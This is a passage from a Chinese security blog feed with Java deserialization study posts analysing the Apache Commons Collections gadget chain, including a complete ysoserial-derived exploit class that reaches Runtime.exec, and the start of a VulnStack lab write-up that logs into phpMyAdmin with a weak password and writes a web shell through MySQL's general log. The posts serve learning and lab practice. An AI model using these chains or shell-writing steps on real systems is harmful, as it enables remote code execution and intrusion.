class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-master<span class="hljs-number">-30099844</span>c6<span class="hljs-number">-1</span>.<span class="hljs-keyword">jar </span>CommonsCollections1 <span class="hljs-string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections1.ser</code></pre><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.ObjectInputStream;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"/Users/osword/Desktop/commonscollections1.ser"</span>);        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);        <span class="hljs-comment">//恢复对象</span>        ois.readObject();        ois.close();    &#125;    &#125;</code></pre><h1 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h1><p>从调用栈学习CommonsCollctions1反序列化利用链构造(摘自ysoserial)</p><p><img src="./image-20200209191315923.png" srcset="/img/loading.gif" alt="image-20200209191315923"></p><p>我比较关注是前半段反序列化入口构造</p><p><img src="./image-20200209191448182.png" srcset="/img/loading.gif" alt="image-20200209191448182"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先看<code>LazyMap.get()</code>构造点,<code>factory</code>可控，执行<code>factory.transform(key)</code>就可以触发后半段链条实现RCE.</p><p><img src="./image-20200209191936614.png" srcset="/img/loading.gif" alt="image-20200209191936614"></p><p>我先想到的是如果<code>LazyMap.readObject()</code>可以直接构造调用到<code>LazyMap.get()</code>，那就省事了.但是此处无法达到目的.</p><p><img src="./image-20200209193711727.png" srcset="/img/loading.gif" alt="image-20200209193711727"></p><p><strong><code>ysoserial</code> commonscollections1 payload</strong>利用AnnotationInovationHandler.invoke()触发LazyMap.get()</p><p>跟进<code>AnnotationInovationHandler.invoke()</code>代码，触发点位于第78行</p><p><img src="./image-20200209194032601.png" srcset="/img/loading.gif" alt="image-20200209194032601"></p><p>此处<code>this.memeberValues</code>可控，可以在<code>AnnotationInovationHandler</code>类初始化参数传入.</p><p><img src="./image-20200209194221667.png" srcset="/img/loading.gif" alt="image-20200209194221667"></p><p>PS:可以跟进<strong>yesoserial commonscollections1</strong>构造，在创建该类时，赋值了<code>LazyMap</code>类</p><p><img src="./image-20200209195059629.png" srcset="/img/loading.gif" alt="image-20200209195059629"></p><p>查阅资料了解<code>AnnotationInovationHandler</code>是proxy代理类，只要<strong>其他类执行了任意方法</strong>都会优先执行<code>invoke</code>方法.</p><p>跟进该类的<code>readObject</code>方法.第352行会执行<code>entryset()</code>方法，从而触发<code>invoke</code>方法.</p><p><img src="./image-20200209194728332.png" srcset="/img/loading.gif" alt="image-20200209194728332"></p><p>后半段分析可以参照前面一篇文章:<a href="https://zhzhdoai.github.io/2020/02/07/Java反序列化学习之CommonsCollections/">https://zhzhdoai.github.io/2020/02/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>触发流程都是从readObject中寻找可以当做跳板的点</p></li><li><p>phpstorm debug有时候会skipped 可以调下设置</p><p><img src="./image-20200209200444889.png" srcset="/img/loading.gif" alt=""></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化学习之反序列化流程及反射类源码分析学习</title>
    <link href="/2020/02/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections/"/>
    <url>/2020/02/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲着也是闲着入门下java反序列化</p><p>通篇文章更多是借用commonscollections学习反序列化和反射的源码</p><h1 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h1><pre><code class="hljs java">ObjectInputStream.readObject<span class="hljs-comment">// 流转化为Object</span>ObjectInputStream.readUnshared <span class="hljs-comment">// 流转化为Object</span>XMLDecoder.readObject <span class="hljs-comment">// 读取xml转化为Object</span>Yaml.load<span class="hljs-comment">// yaml字符串转Object</span>XStream.fromXML<span class="hljs-comment">// XStream用于Java Object与xml相互转化</span>ObjectMapper.readValue<span class="hljs-comment">// jackson中的api</span>JSON.parseObject<span class="hljs-comment">// fastjson中的api</span></code></pre><h1 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h1><p>Demo</p><p>Human类实现Serializable接口用来序列化，主类showunserial实现Human类的序列化和反序列化.</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">showunserial</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;        Human human = <span class="hljs-keyword">new</span> Human();        human.name=<span class="hljs-string">"xiaoming"</span>;        human.age=<span class="hljs-number">18</span>;        File f = <span class="hljs-keyword">new</span> File(<span class="hljs-string">"/tmp/human.ser"</span>);        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(f));        <span class="hljs-comment">//将对象输出为字节流</span>        out.writeObject(human);        out.close();        <span class="hljs-comment">//反序列化</span>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"/tmp/human.ser"</span>);        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);        Human e = <span class="hljs-keyword">null</span>;        e = (Human) in.readObject();        in.close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Human</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span></span>&#123;    <span class="hljs-keyword">public</span> String name;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        in.defaultReadObject();        System.out.println(<span class="hljs-string">"name: "</span>+ name);    &#125;&#125;</code></pre><p>这里利用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>Human</code>类.接着会去调用底层的反序列化方法<code>readObject0</code>方法</p><p><img src="./image-20200206205257856.png" srcset="/img/loading.gif" alt="image-20200206205257856"></p><p>readObject0关键代码如下,选择对象类型，根据不同类型执行操作。</p><p><img src="./image-20200206211328795.png" srcset="/img/loading.gif" alt="image-20200206211328795"></p><p><code>case</code> 进入<code>TC_OBJECT</code>，执行<code>readOrdinaryObject</code>方法.该方法返回一个<code>obj对象</code>。跟进<code>readClassDesc</code>方法，该方法可以加载Human类的各个属性.调用栈如下</p><p><img src="./image-20200207004405873.png" srcset="/img/loading.gif" alt="image-20200207004405873"></p><p><img src="./image-20200207004337661.png" srcset="/img/loading.gif" alt="image-20200207004337661"></p><p><code>readOrdinaryObject</code>方法继续执行,判断需要反序列化的<code>Human</code>类是否可以实例化，是则调用<code>newInstance</code>方法.</p><p><img src="./image-20200206211831099.png" srcset="/img/loading.gif" alt="image-20200206211831099"></p><p>接着执行<code>readSerialData</code>，这里重要是<code>else if</code>语句判断反序列化类是否重写<code>readObject</code>方法,有重写则执行<code>invokeReadObject</code>反射调用重写的<code>readObject</code>方法.</p><p><img src="./image-20200207024346739.png" srcset="/img/loading.gif" alt="image-20200207024346739"></p><p>反序列攻击时序图(@廖师傅)</p><p><img src="http://rui0.cn/wp-content/uploads/2018/07/SequenceDiagram1.png" srcset="/img/loading.gif" alt="SequenceDiagra"></p><h1 id="CommonsCollections"><a href="#CommonsCollections" class="headerlink" title="CommonsCollections"></a>CommonsCollections</h1><p>该反序列化漏洞点主要利用是<code>InvokerTransformer.transform()</code>方法可调用反射类且类变量可控导致RCE.</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>摘自：<a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;                <span class="hljs-comment">//传入Runtime类</span>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime<span class="hljs-class">.<span class="hljs-keyword">class</span>),</span><span class="hljs-class">                //反射调用<span class="hljs-title">getMethod</span>方法，然后<span class="hljs-title">getMethod</span>方法再反射调用<span class="hljs-title">getRuntime</span>方法，返回<span class="hljs-title">Runtime</span>.<span class="hljs-title">getRuntime</span>()方法</span>                new InvokerTransformer("getMethod",                        new Class[] &#123;String.class, Class[].class &#125;,                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>,                        new Class[] &#123;Object.class, Object[].class &#125;,                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-comment">//反射调用exec方法</span>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,                        <span class="hljs-keyword">new</span> Class[] &#123;String<span class="hljs-class">.<span class="hljs-keyword">class</span> &#125;,</span>                        new Object[] &#123;"open /System/Applications/Calculator.app"&#125;)        &#125;;        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);        Map innerMap = <span class="hljs-keyword">new</span> HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        TiedMapEntry entry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">"foo"</span>);        BadAttributeValueExpException poc = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);        <span class="hljs-comment">// val是私有变量，所以利用下面方法进行赋值</span>        Field valfield = poc.getClass().getDeclaredField(<span class="hljs-string">"val"</span>);        valfield.setAccessible(<span class="hljs-keyword">true</span>);        valfield.set(poc, entry);        File f = <span class="hljs-keyword">new</span> File(<span class="hljs-string">"poc.txt"</span>);        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(f));        out.writeObject(poc);        out.close();        <span class="hljs-comment">//从文件中反序列化obj对象</span>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"poc.txt"</span>);        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);        <span class="hljs-comment">//恢复对象</span>        ois.readObject();        ois.close();    &#125;&#125;</code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>InvokerTransformer.transform()</code>中<code>input</code>可控,且能够调用反射类执行<code>input</code>对象方法.</p><p><img src="./image-20200207025834248.png" srcset="/img/loading.gif" alt="image-20200207025834248"></p><p>Java中执行系统命令需要调用<code>Runtime.getRuntime.exec()</code>方法.正常写法，但是并不会有程序员直接调用<code>transform</code>且其中参数可控，如下并不通用。</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test3</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /System/Applications/Calculator.app"&#125;);        invokerTransformer.transform(Runtime.getRuntime());    &#125;&#125;</code></pre><p><strong>ysoserial</strong>工具中<strong>commoncollections1 Payload</strong>利用<code>ChainedTransformer.transform</code>方法,该类能够接受Transformer接口类型的数组，且执行的<code>transform</code>方法循环回调.利用此先传入<code>Runtime.getRuntime()</code>调用反射类返回一个<code>Runtime</code>实例,在循环一次调用<code>exec</code>方法.</p><p><img src="./image-20200207031345268.png" srcset="/img/loading.gif" alt="image-20200207031345268"></p><p><img src="./image-20200207031251470.png" srcset="/img/loading.gif" alt="image-20200207031251470"></p><p>poc修改后如下</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;                <span class="hljs-comment">//传入Runtime类</span>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime<span class="hljs-class">.<span class="hljs-keyword">class</span>),</span><span class="hljs-class">                //反射调用<span class="hljs-title">getMethod</span>方法，然后<span class="hljs-title">getMethod</span>方法再反射调用<span class="hljs-title">getRuntime</span>方法，返回<span class="hljs-title">Runtime</span>.<span class="hljs-title">getRuntime</span>()方法</span>                new InvokerTransformer("getMethod",                        new Class[] &#123;String.class, Class[].class &#125;,                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>,                        new Class[] &#123;Object.class, Object[].class &#125;,                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-comment">//反射调用exec方法</span>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,                        <span class="hljs-keyword">new</span> Class[] &#123;String<span class="hljs-class">.<span class="hljs-keyword">class</span> &#125;,</span>                        new Object[] &#123;"open /System/Applications/Calculator.app"&#125;)        &#125;;        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);      transformerChain.transform(<span class="hljs-string">"input"</span>);    &#125;&#125;</code></pre><p><img src="./image-20200207032711428.png" srcset="/img/loading.gif" alt="image-20200207032711428"></p><p>debug分析，反射类第一个调用如下</p><pre><code class="hljs java"><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>,                        new Class[] &#123;String.class, Class[].class &#125;,                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;)</code></pre><p>执行tranform反射类执行getClass获取合法类名，接着执行getMethod获取方法名，再调用invoke方法执行方法.</p><p><img src="./image-20200207032834363.png" srcset="/img/loading.gif" alt="image-20200207032834363"></p><p>一开始我不明白为啥<code>iMethdName</code>字段赋值为<code>getMethod</code>,</p><p>debug跟进<code>Method method = cls.getMethod(iMethodName, iParamTypes);</code></p><p>底层调用<code>getMethod0</code>方法</p><p><img src="./image-20200207032610303.png" srcset="/img/loading.gif" alt="image-20200207032610303"></p><p>根据返回值跟进<code>privateGetMethodRecursive</code>方法,接着跟进<code>privateGetDeclaredMethods</code>方法，该方法获取VM中所有的方法。</p><p><img src="./image-20200207033703562.png" srcset="/img/loading.gif" alt="image-20200207033703562"></p><p>继续调用<code>searchMethods</code>方法匹配<code>getMethod</code>，返回反射类中的<code>getMethod</code>方法.</p><p><code>public java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) throws java.lang.NoSuchMethodException,java.lang.SecurityException</code></p><p><img src="./image-20200207034408487.png" srcset="/img/loading.gif" alt="image-20200207034408487"></p><p>再来看最后执行的<code>return method.invoke(input, iArgs);</code>，根据调用栈显示<code>invoke0</code>方法会在执行一次反射类的<code>getMehod</code>方法,并进一步搜索getRuntime方法,返回Runtime.getRuntime方法</p><p><img src="./image-20200207035124469.png" srcset="/img/loading.gif" alt="image-20200207035124469"></p><p>借此第一次调用反射类就能够得到Runtime.getRuntime方法。但是要得到Runtime对象需要执行<code>Runtime.getRuntime</code>方法。这就有了第二次反射类调用</p><pre><code class="hljs java"><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>,        new Class[] &#123;Object.class, Object[].class &#125;,        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),</code></pre><p>这里直接看这里<code>return method.invoke(input, iArgs);</code>执行过程,</p><p>底层invoke0调用反射类的invoke方法将Runtime.getRuntime()方法当作参数.</p><p><img src="./image-20200207040920312.png" srcset="/img/loading.gif" alt="image-20200207040920312"></p><p>由于二次调用invoke方法，会再执行invoke0方法，这里就可以直接执行Runtime.getRuntime().至此就能够返回Runtime对象.</p><p><img src="./image-20200207041134155.png" srcset="/img/loading.gif" alt="image-20200207041134155"></p><p>最后接着就可以执行exec方法，开启计算器.</p><p>执行流程类比</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtime</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;        Object obj = Runtime<span class="hljs-class">.<span class="hljs-keyword">class</span></span>;        Class cls = obj.getClass();        Method method;        method = cls.getMethod("getMethod",new Class[] &#123;String.class, Class[].class &#125;);        obj = method.invoke(obj, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;);        cls = obj.getClass();        method = cls.getMethod("invoke",new Class[] &#123;Object.class, Object[].class &#125;);        obj = method.invoke(obj, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;);        cls = obj.getClass();        method = cls.getMethod(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> Class[] &#123; String<span class="hljs-class">.<span class="hljs-keyword">class</span> &#125;)</span>;        method.invoke(obj, <span class="hljs-keyword">new</span> String[] &#123; <span class="hljs-string">"open /System/Applications/Calculator.app"</span> &#125;);    &#125;&#125;</code></pre><p>那么如何利用这个利用链，理想情况下是直接readObject方法直接反序列化或其他触发函数。考虑内置类中的readObject重写且能够相继调用transform方法触发RCE.</p><p>exp利用LazyMap类get方法能够执行transform.</p><p><img src="./image-20200207051857286.png" srcset="/img/loading.gif" alt="image-20200207051857286"></p><p>利用TiedMapEntry类toString中的getValue方法执行get方法.</p><p><img src="./image-20200207052110217.png" srcset="/img/loading.gif" alt="image-20200207052110217"></p><p>最后需要找到触发toString的点，定位到<code>BadAttributeValueExpException</code>类,执行toString方法</p><p><img src="./image-20200207052208864.png" srcset="/img/loading.gif" alt="image-20200207052208864"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>java 反序列化太难写了，前前后后调试很久，稍微理解了反序列化机制和commoncollections反序列化流程.</p><ol><li><p>反序列化优先调用重写readObject</p></li><li><p>利用反射机制可以构造任意类和任意方法并执行</p></li><li><p>java中类变量赋值通过相应的方法赋值或者直接传入实现.</p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://docs.oracle.com/javase/8/docs/api/" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/</a></p><p><a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p><p><a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p><p><a href="http://rui0.cn/archives/tag/java/page/2" target="_blank" rel="noopener">http://rui0.cn/archives/tag/java/page/2</a></p><p><a href="https://zhuanlan.zhihu.com/p/64342725" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/64342725</a></p><p><a href="https://juejin.im/post/5c4d5cc651882524b333d1a0" target="_blank" rel="noopener">https://juejin.im/post/5c4d5cc651882524b333d1a0</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[域渗透]VulnStack 红日红队实战系列(一)</title>
    <link href="/2020/01/28/%E5%9F%9F%E6%B8%97%E9%80%8F-VulnStack-%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E4%B8%80/"/>
    <url>/2020/01/28/%E5%9F%9F%E6%B8%97%E9%80%8F-VulnStack-%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>向老高借了环境玩玩，练练手，学习内网知识</p><blockquote><p>域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><blockquote><p>攻击机(kaili): 172.16.48.133</p><p>Windows7 双网卡：172.16.48.134(NAT模式),192.168.52.143(主机模式)</p><p>windows 2003: 192.168.52.141(DC,主机模式)</p><p>windows 2008 R2 x64: 192.168.52.138(主机模式)</p></blockquote><p>边界主机地址：<a href="http://172.16.48.134" target="_blank" rel="noopener">http://172.16.48.134</a></p><p><img src="./image-20200127184434280.png" srcset="/img/loading.gif" alt="image-20200127184434280"></p><h1 id="边界主机入手"><a href="#边界主机入手" class="headerlink" title="边界主机入手"></a>边界主机入手</h1><p><a href="http://172.16.48.314/phpmyadmin">http://172.16.48.314/phpmyadmin</a></p><p>弱密码：root,root进入</p><p><img src="./image-20200127184657721.png" srcset="/img/loading.gif" alt="image-20200127184657721"></p><blockquote><p>攻击思路：mysql日志写shell,已知nday漏洞，select into outfile</p></blockquote><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>参考链接：<a href="https://www.jianshu.com/p/ddd41b841c36" target="_blank" rel="noopener">https://www.jianshu.com/p/ddd41b841c36</a></p><h3 id="解法一：select-into-outfile-失败"><a href="#解法一：select-into-outfile-失败" class="headerlink" title="解法一：select into outfile(失败)"></a>解法一：select into outfile(失败)</h3><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%secure%'</span>;</code></pre><p>Secure_file_priv显示null无导入导出权限,只能通过修改my.cnf文件置在[mysqld]内加入secure_file_priv =”” 即可</p><p><img src="./image-20200127185150737.png" srcset="/img/loading.gif" alt="image-20200127185150737"></p><h3 id="解法二：mysql日志写shell"><a href="#解法二：mysql日志写shell" class="headerlink" title="解法二：mysql日志写shell"></a>解法二：mysql日志写shell</h3><p>查看日志状态</p><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span>  <span class="hljs-keyword">like</span>  <span class="hljs-string">'%general%'</span>;</code></pre><p><img src="./image-20200127185554340.png" srcset="/img/loading.gif" alt="image-20200127185554340"></p><p>当开启general时，所执行的sql语句会写到stu1.log</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">SET</span> GLOBAL <span class="hljs-attribute">general_log</span>=<span class="hljs-string">'on'</span><span class="hljs-builtin-name">SET</span> GLOBAL <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">'C:\\phpStudy\\www\\shell.php'</span></code></pre><p><img src="./image-20200127190251913.png" srcset="/img/loading.gif" alt="image-20200127190251913"></p><p><img src="./image-20200127190237450.png" srcset="/img/loading.gif" alt="image-20200127190237450"></p><p>收拾复原日志功能</p><p><img src="./image-20200127190338493.png" srcset="/img/loading.gif" alt="image-20200127190338493"></p><h3 id="antSword连接shell"><a href="#antSword连接shell" class="headerlink" title="antSword连接shell"></a>antSword连接shell</h3><p><img src="./image-20200128165355387.png" srcset="/img/loading.gif" alt="image-20200128165355387"></p><h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>双网卡，192.168.52.143应该是内网地址.域名god.org</p><p><img src="./image-20200128172231118.png" srcset="/img/loading.gif" alt="image-20200128172231118"></p><p><img src="./image-20200128172006795.png" srcset="/img/loading.gif" alt="image-20200128172006795"></p><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p>关了防火墙也不行    </p><pre><code class="hljs lsl">for /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span>.%I | findstr <span class="hljs-string">"TTL="</span></code></pre><p><img src="./image-20200128173630452.png" srcset="/img/loading.gif" alt="image-20200128173630452"></p><h4 id="arp-a"><a href="#arp-a" class="headerlink" title="arp -a"></a>arp -a</h4><p><img src="./image-20200128173858608.png" srcset="/img/loading.gif" alt="image-20200128173858608"></p><h3 id="nbtscan-确定域控"><a href="#nbtscan-确定域控" class="headerlink" 